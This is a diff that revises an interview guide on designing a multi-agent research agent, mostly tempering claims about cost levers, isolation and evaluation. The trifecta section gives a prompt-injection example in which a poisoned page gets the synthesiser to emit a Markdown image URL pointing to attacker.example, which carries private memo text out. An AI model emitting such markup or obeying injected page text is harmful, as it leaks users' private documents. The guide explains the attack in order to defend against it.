@@ -436,7 +436,7 @@ The pattern in that column is deliberate. Everything that guards identity, scope
 
 ### 6. Isolate sub-agents so the parent stays small {#walk-isolation}
 
-Sub-agent isolation is the single largest cost lever in this design. A parent that accumulates raw pages resends every token on every later step, because each model call is billed for its whole input. A parent that receives one short conclusion per sub-agent grows by hundreds of tokens per step, not thousands.
+Sub-agent isolation is a candidate cost lever in this design. Rank it against routing, caching and search caps using measured whole-run spend. A parent that accumulates raw pages resends every token on every later step, because each model call is billed for its whole input. A parent that receives one short conclusion per sub-agent grows by hundreds of tokens per step, not thousands.
 
 **Context rot** compounds the cost problem. Model accuracy degrades as the context window fills, and unevenly: information stuck in the middle of a long context is retrieved less reliably than information at either end (the "lost in the middle" result). A run with three well-chosen observations often beats the same run stuffed with twelve.
 
@@ -444,7 +444,7 @@ So isolate when a subtask's intermediate steps are not needed downstream. That i
 
 Two limits keep the claim honest. First, on a ten-step run isolation can shrink the parent's input tokens a lot, but sub-agents bill their own tokens, so measure the total. Anthropic's own write-up of its multi-agent research system reports that multi-agent runs use many more total tokens; isolation alone does not cut the bill. Second, isolation costs you auditability across the boundary. If the parent only sees "Jane Doe is CEO", you cannot explain a wrong conclusion later. Store each sub-agent's full trace and link it from the parent's span.
 
-Isolation is also the security boundary. A web sub-agent that never holds user-document scope cannot leak a private document, whatever a fetched page tells it to do. Step 8 builds on this.
+Credential isolation prevents a web worker from directly retrieving private documents. It does not prove that the whole run cannot leak: the parent later combines private evidence with untrusted findings, and its outputs can still be manipulated. Keep private content out of delegated web queries and enforce the rendering and tool-egress controls from step 8 after synthesis as well.
 
 ### 7. Say the arithmetic aloud {#walk-arithmetic}
 
@@ -490,7 +490,7 @@ Saying the numbers out loud is the senior signal. Derive them in front of the in
 
 Two cautions keep the numbers honest. The 70 seconds is an assumed mean time in system, and Little's Law needs a mean. The p95 of 90 seconds is not a mean and cannot be substituted. Validate the whole estimate against observed arrival bursts and the real service-time distribution before provisioning.
 
-The naive cost line is a seven-step run that sends about 30,000 input tokens plus output, all on the premium model. The source says this blows the $0.20 budget; it cites the provider's pricing page rather than working the dollars, so treat the per-token figure as something to compute with current prices. Three levers bring the run back under $0.20:
+The naive cost line is a seven-step run that sends about 30,000 input tokens plus output, all on the premium model. The source says this blows the $0.20 budget; it cites the provider's pricing page rather than working the dollars, so treat the per-token figure as something to compute with current prices. Three levers can help meet $0.20, subject to measured token counts, model prices and quality checks:
 
 - **Sub-agent isolation.** The parent sees hundreds of tokens, not raw pages, so the planner's calls stay cheap. Each sub-agent still pays for the pages it reads.
 - **Prefix caching.** The provider caches the stable start of a prompt (instructions and tool definitions) so repeated calls pay less for it.
@@ -504,7 +504,7 @@ The **lethal trifecta** is three capabilities that are dangerous together: readi
 
 This agent reads private data and processes untrusted web content. It has no external communication tool, so the third leg looks absent. It is not, because the rendered answer is itself a channel. A Markdown image whose URL encodes private text is **exfiltration** (data leaving without permission) the moment the client fetches it. For example, a poisoned page persuades the synthesiser to include `![](https://attacker.example/p?q=<memo text>)`; the user's browser requests that URL to draw the image, and the memo text reaches the attacker's server logs.
 
-The rendering path therefore needs an egress firewall. It strips Markdown images, non-allowlisted links and fetch-inducing markup. Meanwhile web sub-agents hold zero user-document scope, so an injection in a fetched page cannot reach the private corpus, even in principle. Call it **privilege separation**, in those words.
+The rendering path therefore needs an egress firewall. It strips Markdown images, non-allowlisted links and fetch-inducing markup. Meanwhile web sub-agents hold zero user-document scope, preventing direct private retrieval through their tools. Typed findings remain untrusted content when the parent reads them. Validate the schema, preserve provenance and enforce access and egress controls in the parent too. Call it **privilege separation**, in those words.
 
 Prompt defences, such as telling the model to ignore instructions in pages, are rate-reducers, not boundaries. Keep them, and never present them as the control. The boundary is the gateway, the scope separation, and egress control on both the tool path and the rendering path. The [permission and trust topology](#dive-trust) deep dive adds cache keys and the tests.
 
@@ -531,7 +531,7 @@ def route(state) -> Literal["agent", "give_up", "end"]:
 
 Read it top to bottom. If the supervisor has marked the task complete, the run ends. If the hop counter has reached eight, the run gives up with partial results and a reason. Otherwise it builds a signature from the next agent's name and the first 200 characters of the latest message. If that signature equals the last delegation's, the same request is going to the same agent again, so the loop is not converging and the run gives up.
 
-Do not skip the no-progress signature. A hop cap alone still lets a supervisor and worker burn the whole budget rejecting and retrying the identical request; it only bounds how much they burn. The signature catches the loop on hop two instead of hop eight. This is the canonical multi-agent failure: the supervisor rejects, the worker retries the same way, and the supervisor rejects again. The remaining defence is feedback specific enough for the worker to change its approach.
+Do not skip the no-progress signature. A hop cap alone still lets a supervisor and worker burn the whole budget rejecting and retrying the identical request; it only bounds how much they burn. The signature can catch an identical consecutive delegation on hop two. Because it compares only 200 characters, it can also stop distinct requests with the same prefix and miss equivalent requests phrased differently. In production, hash a canonical full request with tool identity, relevant state version and evidence progress, and retain the hard caps. This is the canonical multi-agent failure: the supervisor rejects, the worker retries the same way, and the supervisor rejects again. The remaining defence is feedback specific enough for the worker to change its approach.
 
 Every ceiling returns partial results with a reason rather than raising an error. Add the per-run budget as a fourth ceiling: the anchor's budget dict, summed across branches, stops the run at $0.20. One implementation detail matters with parallel branches: if spend is only summed after branches finish, the overrun is observed too late, so reserve budget before a branch starts and reconcile the actual cost afterwards. That reservation step is this rewrite's addition, not the source's.
 
@@ -599,7 +599,7 @@ The summary rule for the whole ladder: on a cap or an outage, provide a partial 
 
 ### 11. Measure it and name the metric that would prove it wrong {#walk-evaluation}
 
-A design that cannot be falsified cannot be improved. Name the one metric whose value would say the architecture was the wrong bet. Here that metric is the **grade distribution**: the spread of coverage grades across runs. If most runs grade poorly even after the grader is corrected, the corpus is the constraint, not the architecture, and the wrong thing was built. More agents will not fix missing evidence.
+A design that cannot be falsified cannot be improved. Name the one metric whose value would say the architecture was the wrong bet. Here that metric is the **grade distribution**: the spread of coverage grades across runs. If most runs grade poorly after validating the grader, inspect whether the required evidence exists, whether retrieval finds it, and whether synthesis uses it. Missing corpus evidence is one falsifying result: adding agents cannot recover facts absent from the available sources. Grade distribution alone cannot distinguish that from retrieval or planning defects.
 
 Evaluate at two levels. **Outcome** evaluation asks whether the final answer was right. **Trajectory** evaluation asks whether the run took a sensible path: did the planner decompose sensibly, did agents stay in role, how many hops did it take. Trajectory matters more in a multi-agent system. A run that reaches the right answer through six wasted hops is one prompt change away from not reaching it. Track both, because a good-looking answer can have unsafe routing and a safe trajectory can still miss the user's question.
 
@@ -770,7 +770,7 @@ The mock design lists four costs that belong in the answer:
 
 1. A supervisor adds one model call per hop.
 2. Passing full history to every agent makes hop N pay for hops 1 to N-1, so pass a summary instead.
-3. Constrain routing with a `Literal` type over the real agent names, so the supervisor cannot route to an agent that does not exist.
+3. Declare a `Literal` type over the real agent names, then validate the proposed route at runtime against that allowlist before dispatch. The annotation alone does not reject a malformed model response.
 4. Parallel agents over one corpus duplicate retrieval, so share one retrieval step upstream.
 
 When attributing cost, the same mock adds two moves: collapse agents whose only job is passing messages along, and route only hard steps to the expensive model.
@@ -821,7 +821,7 @@ The source author built the same product and deployed it on AWS; the source call
 <tr>
 <td>7 · Observability</td>
 <td>One trace per request</td>
-<td>LangSmith spans with eval scores attached; in-process <code>all-MiniLM-L6-v2</code> embeddings add no gateway latency or cost</td>
+<td>LangSmith spans with eval scores attached; in-process <code>all-MiniLM-L6-v2</code> embeddings avoid a gateway call but still consume compute and add local latency</td>
 </tr>
 <tr>
 <td>8 · Red team</td>
@@ -866,6 +866,8 @@ The source compares three ways to build the same product. Each is a real option 
 
 ### References and source notes {#dive-sources}
 
+The November review qualifies the original privacy, cost and grade-distribution claims. Typed findings do not make injected content trustworthy, and whole-run cost savings need measurement. The routing code remains an illustrative sketch, with its signature limitations explained above. Historical deployment details are source-reported, not a deployment reproduced for this review. [OWASP LLM01](https://genai.owasp.org/llmrisk/llm01-prompt-injection/) supports layered controls. [Python typing](https://docs.python.org/3/library/typing.html) distinguishes annotations from runtime enforcement.
+
 The source was fact-checked on 27 September 2026. Each reference is listed with the claim it supports in this case.
 
 - [LangGraph docs: INVALID_CONCURRENT_GRAPH_UPDATE](https://docs.langchain.com/oss/python/langgraph/errors/INVALID_CONCURRENT_GRAPH_UPDATE): parallel writes to a key with no reducer raise an error; silent loss needs a hand-rolled merge.
@@ -903,7 +905,7 @@ These are the source's eleven self-check questions, with its answers. Answer eac
 
 <details class="answer-reveal" id="research-check-3"><summary>Derive the concurrency number.</summary><div class="detail-body"><p>40,000 runs a day is about 28 a minute; peaked threefold that is about 84, rounded up to about 100 runs a minute. At about 70 seconds mean time in system, Little's Law gives about 120 in flight. At a 70% utilisation target, provision around 170.</p></div></details>
 
-<details class="answer-reveal" id="research-check-4"><summary>What is the single largest cost lever, and what does it give up?</summary><div class="detail-body"><p>Sub-agent isolation. It gives up auditability across the boundary unless each sub-agent's trace is stored and linked from the parent's span. It also does not cut the bill by itself, because sub-agents pay for their own tokens.</p></div></details>
+<details class="answer-reveal" id="research-check-4"><summary>What is the single largest cost lever, and what does it give up?</summary><div class="detail-body"><p>The source nominates sub-agent isolation. Confirm its ranking with measured whole-run cost. It gives up auditability across the boundary unless access-controlled sub-agent traces are linked from the parent's span. Sub-agents still pay for their own tokens.</p></div></details>
 
 <details class="answer-reveal" id="research-check-5"><summary>The agent has no email or webhook tool. Why is the trifecta still live?</summary><div class="detail-body"><p>The rendered answer is a channel. A Markdown image URL can carry private text out when the client fetches it. Filter rendering with an egress firewall that strips images, non-allowlisted links and fetch-inducing markup.</p></div></details>
 
@@ -911,7 +913,7 @@ These are the source's eleven self-check questions, with its answers. Answer eac
 
 <details class="answer-reveal" id="research-check-7"><summary>What is the strong answer to "what breaks first?"</summary><div class="detail-body"><p>Search returns empty during an outage, empty is treated as valid, and an uncited answer ships. Watch the citation-free answer rate. Type empty apart from unavailable, and turn unavailable into a gap note.</p></div></details>
 
-<details class="answer-reveal" id="research-check-8"><summary>Which metric would prove the design wrong?</summary><div class="detail-body"><p>The grade distribution. If most runs grade poorly even after the grader is corrected, the corpus is the constraint, not the architecture.</p></div></details>
+<details class="answer-reveal" id="research-check-8"><summary>Which metric would prove the design wrong?</summary><div class="detail-body"><p>The grade distribution. After validating the grader, poor scores trigger corpus, retrieval and synthesis checks. If the necessary evidence is absent from the corpus, adding agents will not repair it.</p></div></details>
 
 <details class="answer-reveal" id="research-check-9"><summary>Name two properties the deployed Research Platform lacks.</summary><div class="detail-body"><p>Per-user access control (one API key, no tenant model, a shared report cache), and a deterministic release gate (its judge scores are observability only).</p></div></details>
 
@@ -931,9 +933,9 @@ The source's follow-up bank gives the shape of a strong answer to eight common p
 
 <details class="answer-reveal" id="followup-model-worse"><summary>What if the model gets worse?</summary><div class="detail-body"><p><strong>Shape:</strong> version pinning, evaluation before adoption, canary with guardrails, automatic rollback, a second provider behind an adapter.</p><p><strong>Here:</strong> pin model versions in the control plane, run the evaluation suite before adopting a new one, canary it on a slice of traffic with the leak and claim-support guardrails, and roll back automatically. The deployed platform's gateway shows the adapter: agents name a function, not a model.</p></div></details>
 
-<details class="answer-reveal" id="followup-cost"><summary>How much does it cost?</summary><div class="detail-body"><p><strong>Shape:</strong> the per-run arithmetic derived aloud, the blended figure, the levers with expected effect.</p><p><strong>Here:</strong> a naive seven-step run of about 30,000 input tokens on the premium tier blows $0.20. Isolation, prefix caching and tier routing bring the blended figure under it; state each lever's expected effect and measure cost by branch to confirm.</p></div></details>
+<details class="answer-reveal" id="followup-cost"><summary>How much does it cost?</summary><div class="detail-body"><p><strong>Shape:</strong> the per-run arithmetic derived aloud, the blended figure, the levers with expected effect.</p><p><strong>Here:</strong> a naive seven-step run of about 30,000 input tokens on the premium tier blows $0.20. Isolation, prefix caching and tier routing are candidates for bringing the blended figure under it; state each lever's expected effect and measure cost by branch to confirm.</p></div></details>
 
-<details class="answer-reveal" id="followup-boundary"><summary>Where's the security boundary?</summary><div class="detail-body"><p><strong>Shape:</strong> the gateway, the trifecta analysis, egress control on both the tool path and the rendering path.</p><p><strong>Here:</strong> web agents hold zero document scope, so an injection cannot reach the private corpus; the rendered answer is the outbound channel, so an egress firewall filters it.</p></div></details>
+<details class="answer-reveal" id="followup-boundary"><summary>Where's the security boundary?</summary><div class="detail-body"><p><strong>Shape:</strong> the gateway, the trifecta analysis, egress control on both the tool path and the rendering path.</p><p><strong>Here:</strong> web agents hold zero document scope, preventing direct private retrieval. The parent must still treat their findings as untrusted when it combines them with private evidence. Filter the rendered answer as an outbound channel.</p></div></details>
 
 <details class="answer-reveal" id="followup-two-week"><summary>What would you cut for a 2-week version?</summary><div class="detail-body"><p><strong>Shape:</strong> a specific reduced scope that still has an oracle and a failure ladder, plus what you would NOT cut and why.</p><p><strong>Here (illustrative):</strong> one web worker and one document worker with a fixed plan, no cache and no replan. Do not cut the citation verifier, the typed <code>EMPTY</code>/<code>UNAVAILABLE</code> result, the zero document scope on the web worker or the egress firewall, because those are the oracle and the privacy boundary.</p></div></details>
 
@@ -1057,7 +1059,7 @@ The source gives two spoken versions and a set of lines worth saying verbatim. B
 
 <details class="answer-reveal" id="spoken-full"><summary>Give the full two-minute spoken answer with the numbers.</summary><div class="detail-body"><p>"This is a read-only research agent, forty thousand runs a day, peaking at three times the mean, under ninety seconds at p95 with a first signal in three, and twenty cents a run. Success is every claim cited to a source a reviewer would accept.</p>
 <p>A planner on the reasoning tier decides whether to decompose and writes a dependency-aware plan. Web sub-agents fetch and read in their own windows and hold no access to the user's documents. A separate user-scoped sub-agent reads those. Only typed findings cross the schema boundary into a deduplicated evidence ledger with a concatenating merge, so no parallel branch is lost. A grader checks coverage and agreement, the synthesiser writes with citations, and a verifier checks every claim before the answer streams with a coverage note.</p>
-<p>At peak that is about a hundred runs a minute and around a hundred and twenty in flight, so I would provision around a hundred and seventy. A naive seven-step run blows the budget, and sub-agent isolation, prefix caching and tier routing bring it back.</p>
+<p>At peak that is about a hundred runs a minute and around a hundred and twenty in flight, so I would provision around a hundred and seventy. A naive seven-step run blows the budget, and I would test sub-agent isolation, prefix caching and tier routing against measured cost before claiming it fits.</p>
 <p>On safety, the agent reads private data and untrusted pages. The rendered answer is its outbound channel, so rendering goes through an egress firewall. The metric that would prove me wrong is the grade distribution."</p></div></details>
 
 <details class="answer-reveal" id="spoken-lines"><summary>Which lines carry the round?</summary><div class="detail-body"><ul>
@@ -1066,9 +1068,9 @@ The source gives two spoken versions and a set of lines worth saying verbatim. B
 <li>"Evidence merges by concatenation. Last-write-wins silently loses branches."</li>
 <li>"A hundred a minute, a hundred and twenty in flight, a hundred and seventy provisioned."</li>
 <li>"The rendered answer is a channel. Egress control goes on the rendering path too."</li>
-<li>"Web agents hold zero document scope, so an injection can't reach the private corpus even in principle."</li>
+<li>"Web agents hold zero document scope. I also keep private facts out of delegated queries and enforce egress controls after synthesis."</li>
 <li>"Empty is not unavailable. Type the difference."</li>
-<li>"If most runs grade poorly after correction, the corpus is the constraint, not the architecture."</li>
+<li>"Poor grades after grader correction make me check corpus coverage, retrieval and synthesis separately."</li>
 </ul></div></details>
 
 ### Calibrate your answer to the level {#practice-levels}
@@ -1124,7 +1126,7 @@ Keep web and private-document credentials separate. Append branch evidence; neve
 - 40,000 runs a day ≈ 28 a minute; a 3× peak ≈ 84 a minute, rounded up to 100.
 - About 120 concurrent at a 70-second mean run time (Little's Law needs the mean, not p95); about 170 slots at 70% utilisation.
 - p95 under 90 seconds, first signal under 3 seconds, a $0.20 ceiling a run, 3 to 12 planned steps.
-- A naive seven-step run of about 30,000 input tokens on the premium tier blows the budget; isolation, prefix caching and tier routing bring it back.
+- A naive seven-step run of about 30,000 input tokens on the premium tier blows the budget; isolation, prefix caching and tier routing must be measured before claiming it fits.
 - Hard caps on hops (eight in the example), tools, time and budget, plus a no-progress signature.
 - Deployed platform: 10 requests per 60 seconds per IP; cache ≥ 0.85, durable memory ≥ 0.88, related context 0.50 to 0.88.
 
@@ -1140,7 +1142,7 @@ Evaluate claim-citation support, coverage, cross-user leaks, p95, first signal, 
 - Requirements are testable: about 40,000 runs a day, p95 under 90 seconds, first signal under 3 seconds, $0.20 a run, read-only, per-user isolation.
 - State carries a concatenating evidence list and a budget summed across branches, so no parallel result is lost.
 - The architecture separates an untrusted web zone from a user-scoped zone, joined only by typed findings.
-- Sub-agent isolation is the largest cost lever and also the security boundary.
+- Sub-agent isolation limits parent-context growth and direct tool access. Measure total cost, and protect the parent and rendering path too.
 - The arithmetic is 100 runs a minute at peak, about 120 in flight by Little's Law, around 170 provisioned.
 - The rendered answer is an exfiltration channel, so an egress firewall on rendering is mandatory.
 - Termination uses a done flag, a hop cap, a no-progress check and a per-run budget, each returning partial results.
